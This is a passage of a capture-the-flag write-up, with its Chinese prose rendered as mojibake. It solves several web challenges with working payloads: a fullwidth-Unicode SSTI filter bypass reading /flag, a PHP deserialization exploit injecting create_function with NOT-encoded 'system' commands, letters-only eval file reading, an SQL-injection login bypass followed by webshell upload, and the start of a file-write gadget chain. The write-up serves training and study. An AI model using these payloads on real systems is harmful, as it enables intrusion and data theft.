class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;è®¨åŒå•¦ä¸æ˜¯è¯´å¥½åªçœ‹çœ‹ä¸æ‘¸çš„å—&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error500</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ä¸è¦é€è¿›æ¥å•Šå•Šå•Šå•Š&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    os.makedirs(<span class="string">&#x27;static&#x27;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#åŸç¥ï¼Œå¯åŠ¨!</span></span><br><span class="line">    run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>åœ¨æºç  <code>view_file</code> å‡½æ•°ä¸­ï¼Œç›´æ¥å°†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹ä¼ é€’ç»™äº† Bottle æ¡†æ¶çš„ <code>template()</code> å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> template(content)</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„SSTIæ¼æ´</p>
<p>ä½†æºç ä¸­å®šä¹‰äº†ä¸¥æ ¼çš„ <code>BLACKLIST</code>ï¼Œè¿‡æ»¤äº†ç»å¤§å¤šæ•°å°å†™å­—æ¯ï¼ˆåŒ…æ‹¬ <code>o</code>, <code>p</code>, <code>e</code>, <code>n</code>, <code>r</code>, <code>e</code>, <code>a</code>, <code>d</code> ç­‰ï¼‰ä»¥åŠç‰¹æ®Šç¬¦å·ï¼ˆ<code>%</code>, <code>;</code>, <code>&lt;</code>, <code>&gt;</code> ç­‰ï¼‰ã€‚</p>
<p><strong>åˆ©ç”¨ Python 3 çš„ Unicode æ ‡å‡†åŒ–ç‰¹æ€§ (NFKC)</strong>ã€‚Python 3 è§£é‡Šå™¨åœ¨è§£æä»£ç æ—¶ï¼Œä¼šå°†<strong>å…¨è§’å­—ç¬¦</strong>å’Œå…¶ä»–å…¼å®¹å­—ç¬¦æ ‡å‡†åŒ–ä¸ºå¯¹åº”çš„ ASCII å­—ç¬¦ã€‚</p>
<p>ä¾‹å¦‚ï¼ŒPython è§£é‡Šå™¨æ‰§è¡Œæ—¶ï¼Œ<code>ï½ï½ï½…ï½</code> ä¼šè¢«è§£æä¸º <code>open</code> å‡½æ•°ã€‚</p>
<p>æœ€ç»ˆ Payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ï½ï½ï½…ï½(<span class="string">&#x27;/flag&#x27;</span>).ï½’ï½…ï½ï½„() &#125;&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>åœ¨ä¸­æ–‡è¾“å…¥æ³•çŠ¶æ€ä¸‹ï¼ŒæŒ‰ <code>Shift + Space</code> åˆ‡æ¢åˆ°â€œå…¨è§’æ¨¡å¼â€ï¼Œç„¶åè¾“å…¥ <code>open</code> å’Œ <code>read</code>ã€‚</p>
</li>
<li><p>æ–°å»ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶<code>payload.txt</code>ï¼Œä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨å†™å…¥ä»¥ä¸‹å†…å®¹ï¼ˆæ³¨æ„å…¨è§’å’ŒåŠè§’çš„æ··åˆï¼‰ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ï½ï½ï½…ï½(<span class="string">&#x27;/flag&#x27;</span>).ï½’ï½…ï½ï½„() &#125;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å°† <code>payload.txt</code> å‹ç¼©ä¸º <code>payload.zip</code>åä¸Šä¼ </p>
</li>
</ol>
<hr>
<h1 id="3-Bypass"><a href="#3-Bypass" class="headerlink" title="3. Bypass"></a>3. Bypass</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$a</span>.<span class="variable">$b</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$b</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Try again!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$blocked_a</span> = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;dl&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;escape&#x27;</span>, <span class="string">&#x27;er&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;ay&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;open&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$blocked_b</span> = [<span class="string">&#x27;find&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;pa&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;alter&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;sy&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pattern_a</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_a</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern_b</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_b</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_a</span>, <span class="variable">$a</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_b</span>, <span class="variable">$b</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$p</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>eval($a.$b);</code>æ”¾åœ¨<code>__construct</code> é‡Œæ‘¸ä¸åˆ°ï¼Œè¿™é¢˜å¯ä»¥é€šè¿‡è°ƒç”¨create_functionå‡½æ•°å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p>
<p>ç”±äºcreate_functionå‡½æ•°çš„ç‰¹æ®Šæ€§ï¼Œå®ƒä¸æ˜¯ç›´æ¥è¿è¡Œä½ çš„ä»£ç ï¼Œè€Œæ˜¯<strong>æŠŠä»£ç åŒ…åœ¨ä¸€ä¸ªå‡½æ•°å®šä¹‰é‡Œ</strong>å†å»è¿è¡Œï¼Œä¾‹å¦‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abcd</span>(<span class="params"></span>) </span>&#123; [ä»£ç ] &#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥payloaadéœ€è¦è¿›è¡Œä»¥<code>} [ä»£ç ] //</code>çš„å½¢å¼æ„é€ ï¼Œé—­åˆå‰é¢å‡½æ•°</p>
<p>é»‘åå• aï¼šè¿‡æ»¤äº†</p>
<p>â€˜evalâ€™, â€˜dlâ€™, â€˜lsâ€™, â€˜pâ€™, â€˜escapeâ€™, â€˜erâ€™, â€˜strâ€™, â€˜catâ€™, â€˜flagâ€™, â€˜fileâ€™, â€˜ayâ€™, â€˜orâ€™, â€˜ftpâ€™, â€˜dictâ€™, â€˜..â€˜, â€˜hâ€™, â€˜wâ€™, â€˜execâ€™, â€˜sâ€™, â€˜openâ€™</p>
<p>é»‘åå• bï¼šè¿‡æ»¤äº†</p>
<p>â€˜findâ€™, â€˜filterâ€™, â€˜câ€™, â€˜paâ€™, â€˜procâ€™, â€˜dirâ€™, â€˜regexpâ€™, â€˜nâ€™, â€˜alterâ€™, â€˜loadâ€™, â€˜grepâ€™, â€˜oâ€™, â€˜fileâ€™, â€˜tâ€™, â€˜wâ€™, â€˜insertâ€™, â€˜sortâ€™, â€˜hâ€™, â€˜syâ€™, â€˜..â€˜, â€˜arrayâ€™, â€˜shâ€™, â€˜touchâ€™, â€˜eâ€™, â€˜phpâ€™, â€˜fâ€™</p>
<p>å¯ä»¥è”åŠ¨æ— å­—æ¯rceçš„çŸ¥è¯†ï¼Œç”¨å–åç»•è¿‡é»‘åå•</p>
<p>ä½†ç”±äºæœ¬é¢˜åœ¨ç»•è¿‡ä¸¤ä¸ªé»‘åå•æ—¶æ˜¯åœ¨phpä»£ç å†…éƒ¨ï¼Œè€Œä¸æ˜¯åœ¨urlæ ï¼Œæ‰€ä»¥ä¸èƒ½é‡‡ç”¨urlç¼–ç ï¼Œå¯ä»¥é‡‡ç”¨åå…­è¿›åˆ¶è½¬æ¢</p>
<p>åœ¨kaliç»ˆç«¯é‡‡ç”¨å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&quot;echo bin2hex(~&#x27;system&#x27;);&quot;</span></span><br><span class="line">//8c868c8b9a92</span><br><span class="line">php -r <span class="string">&quot;echo bin2hex(~&#x27;cat /flag&#x27;);&quot;</span></span><br><span class="line">//9c9e8bdfd099939e98</span><br></pre></td></tr></table></figure>

<p>æ¢æˆ\xxå½¢å¼ï¼Œæ¥ç€å¡«å…¥exp.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;create_function&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;&#125; (~\&quot;\x8c\x86\x8c\x8b\x9a\x92\&quot;)((~\&quot;\x9c\x9e\x8b\xdf\xd0\x99\x93\x9e\x98\&quot;)); //&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>));</span><br><span class="line"><span class="comment">//O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A7%3A%22%00FLAG%00a%22%3Bs%3A15%3A%22create_function%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A33%3A%22%7D+%28%7E%22%8C%86%8C%8B%9A%92%22%29%28%28%7E%22%9C%9E%8B%DF%D0%99%93%9E%98%22%29%29%3B+%2F%2F%22%3B%7D</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="4-ezrce"><a href="#4-ezrce" class="headerlink" title="4. ezrce"></a>4. ezrce</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z\(\)_;]+$/&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;å¸ˆå‚…ï¼Œä½ æƒ³æ‹¿flagï¼Ÿ&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­£åˆ™ <code>/^[A-Za-z\(\)_;]+$/</code> è¿‡æ»¤äº†å‚æ•°è¾“å…¥ï¼Œåªèƒ½ä½¿ç”¨å¤§å°å†™å­—æ¯ã€å°æ‹¬å· <code>()</code>ã€åˆ†å· <code>;</code> å’Œä¸‹åˆ’çº¿ <code>_</code></p>
<p>å…ˆæµ‹è¯•payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾ï¼š</p>
<p>array(3) { [0]&#x3D;&gt; string(1) â€œ.â€ [1]&#x3D;&gt; string(2) â€œ..â€ [2]&#x3D;&gt; string(9) â€œindex.phpâ€ }</p>
<p>è¯´æ˜flagä¸åœ¨å½“å‰ç›®å½•ï¼Œå°è¯•æ‰“å°æ ¹ç›®å½•çš„æ–‡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(dirname(dirname(dirname(getcwd())))));</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾ï¼š</p>
<p>array(21) { [0]&#x3D;&gt; string(1) â€œ.â€ [1]&#x3D;&gt; string(2) â€œ..â€ [2]&#x3D;&gt; string(10) â€œ.dockerenvâ€ [3]&#x3D;&gt; string(3) â€œbinâ€ [4]&#x3D;&gt; string(3) â€œdevâ€ [5]&#x3D;&gt; string(3) â€œetcâ€ [6]&#x3D;&gt; string(4) â€œflagâ€ [7]&#x3D;&gt; string(4) â€œhomeâ€ [8]&#x3D;&gt; string(3) â€œlibâ€ [9]&#x3D;&gt; string(5) â€œmediaâ€ [10]&#x3D;&gt; string(3) â€œmntâ€ [11]&#x3D;&gt; string(3) â€œoptâ€ [12]&#x3D;&gt; string(4) â€œprocâ€ [13]&#x3D;&gt; string(4) â€œrootâ€ [14]&#x3D;&gt; string(3) â€œrunâ€ [15]&#x3D;&gt; string(4) â€œsbinâ€ [16]&#x3D;&gt; string(3) â€œsrvâ€ [17]&#x3D;&gt; string(3) â€œsysâ€ [18]&#x3D;&gt; string(3) â€œtmpâ€ [19]&#x3D;&gt; string(3) â€œusrâ€ [20]&#x3D;&gt; string(3) â€œvarâ€ }</p>
<p>å‘ç°flagæ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶å†…å®¹ï¼ˆæ²¡å‡ºæ¥å°±å¤šåˆ·æ–°å‡ æ¬¡ï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chdir(dirname(dirname(dirname(getcwd()))));show_source(array_rand(array_flip(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="5-flagåˆ°åº•åœ¨å“ª"><a href="#5-flagåˆ°åº•åœ¨å“ª" class="headerlink" title="5. flagåˆ°åº•åœ¨å“ª"></a>5. flagåˆ°åº•åœ¨å“ª</h1><p>é“¾æ¥è¿›å»åä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ‰«ç›®å½•æ‰«å‡º&#x2F;robots.txtå’Œ&#x2F;admin&#x2F;login.php</p>
<p>è®¿é—®&#x2F;admin&#x2F;login.phpå‡ºç°ç™»å½•æ¡†</p>
<p>æ ¹æ®æç¤ºÂ usernameè¾“å…¥adminï¼Œå¯†ç åˆ™å°è¯•ä¸‡èƒ½å¯†ç ï¼Œå†æ ¹æ®é¢˜ç›®æç¤ºè¦ä½¿ç”¨å¤§å†™ï¼Œä½¿ç”¨ä¸‡èƒ½å¯†ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; #</span><br></pre></td></tr></table></figure>

<p>è¿›å»åçš„é¡µé¢ç›´æ¥è¯´æ˜<strong>ä¸Šä¼  PHP Webshell</strong>ï¼Œé‚£å°±ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œç”¨èšå‰‘è¿æ¥åä½¿ç”¨æ’ä»¶æŸ¥çœ‹phpinfoæ‰¾åˆ°flag</p>
<hr>
<h1 id="6-æ¥ç­¾ä¸ªåˆ°å§"><a href="#6-æ¥ç­¾ä¸ªåˆ°å§" class="headerlink" title="6. æ¥ç­¾ä¸ªåˆ°å§"></a>6. æ¥ç­¾ä¸ªåˆ°å§</h1><p>çœ‹é™„ä»¶ï¼Œå…ˆçœ‹index.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./classes.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&quot;shark&quot;</span>] ?? <span class="string">&#x27;å–µå–µå–µ?&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">str_starts_with</span>(<span class="variable">$s</span>, <span class="string">&quot;blueshark:&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$ss</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>, <span class="title function_ invoke__">strlen</span>(<span class="string">&quot;blueshark:&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$o</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ss</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$p</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO notes (content) VALUES (?)&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$ss</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;save sucess!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å–µå–µå–µ?&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$q</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id, content FROM notes ORDER BY id DESC LIMIT 10&quot;</span>);</span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$q</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çŸ¥é“ï¼š</p>
<ol>
<li><p>POSTä¼ å…¥sharkå‚æ•°</p>
</li>
<li><p>ä¼šæ£€éªŒå‰ç¼€æ˜¯å¦æ˜¯blueshark:</p>
</li>
<li><p>@unserialize($ss)ä¼šè§¦å‘ååºåˆ—åŒ–ï¼ŒåŒæ—¶@æŠ‘åˆ¶æŠ¥é”™</p>
</li>
<li><p>ä½¿ç”¨äº† <strong>PDO é¢„å¤„ç†</strong>ï¼Œæœç»äº† SQL æ³¨å…¥æ¼æ´</p>
</li>
</ol>
<p>å†çœ‹classes.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLogger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logfile</span> = <span class="string">&quot;/tmp/notehub.log&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$f</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logfile = <span class="variable">$f</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content .= <span class="variable">$msg</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logfile, <span class="variable">$this</span>-&gt;content, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;content) &#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logfile, <span class="variable">$this</span>-&gt;content, FILE_APPEND);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShitMountant</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="keyword">new</span> <span class="title class_">FileLogger</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;logger) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;fetched ==&gt; &quot;</span> . <span class="variable">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æŠ“ä½<strong>å…³é”®å‡½æ•°file_put_contents</strong>ï¼Œè¿™é‡Œå°±æ˜¯ä¼ å…¥shellå¹¶è¯»å–flagçš„å…³é”®</p>
<p>å†çœ‹config.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_FILE&#x27;</span>, <span class="string">&#x27;/tmp/notehub.db&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(DB_FILE)) &#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:&#x27;</span> . DB_FILE);</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;CREATE TABLE notes (id INTEGER PRIMARY KEY AUTOINCREMENT, content TEXT)&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:&#x27;</span> . DB_FILE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªæ˜¯è¯´æ˜è¿æ¥åˆ°æˆ–è€…è‡ªåŠ¨åˆå§‹åŒ–ä¸€ä¸ª SQLite æ•°æ®åº“ï¼Œæ²¡æœ‰ä»€ä¹ˆå¤ªå¤§ä½œç”¨</p>
<p>æœ€åçœ‹api.phpï¼š</p>
